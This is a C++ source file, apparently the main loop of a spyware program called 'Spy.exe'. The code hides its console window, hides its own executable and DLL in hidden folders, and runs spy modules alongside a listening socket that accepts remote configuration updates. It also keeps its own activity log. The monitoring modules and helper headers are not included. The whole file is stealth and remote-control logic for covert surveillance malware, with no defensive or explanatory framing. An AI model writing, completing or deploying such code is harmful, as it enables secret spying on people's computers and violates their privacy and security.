#pragma once
#include "Headers.h"
#include "Commonfunctional.h"
#include "InitControl.h"
#include "ThreadStart.h"
#include "ThreadSocket.h"
#include "Singlemodulesrun.h"
#include "ControlCopy.h"

void main(void)
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	control *B = new control, C;
	ofstream out;
	pthread_t ModuleStarter, ListenSocket;

	CreateHiddenFolders();
	HideFile("pthreadVSE2.dll");
	HideFile("Spy.exe");

	InitControl(C);

	OutTextWithTime("SpyLog//Spy.txt", "Threads were started in ", &C, out);

	do {
	
		pthread_create(&ModuleStarter, NULL, Start, (void*)&C);
		pthread_create(&ListenSocket, NULL, ListenSocketProc, (void*)&C);
		pthread_join(ListenSocket, (void**)&B);

		if (B == NULL)
		{
			OutTextWithTime("SpyLog//Spy.txt", "Configuration file Config.ksb is not found! Using last successfull configuration! Time: ", &C, out);
			B = new control;
			do {

				pthread_create(&ListenSocket, NULL, ListenSocketProc, (void*)&C);
				pthread_join(ListenSocket, (void**)&B);

			} while (B == NULL);
		}

		Copy(C, B);

		KillModules();
		OutTextWithTime("SpyLog//Spy.txt", "Threads were restarted in ", &C, out);

	} while (C.stop != true);

	OutTextWithTime("SpyLog//Spy.txt", "Threads were stopped in ", NULL, out);
}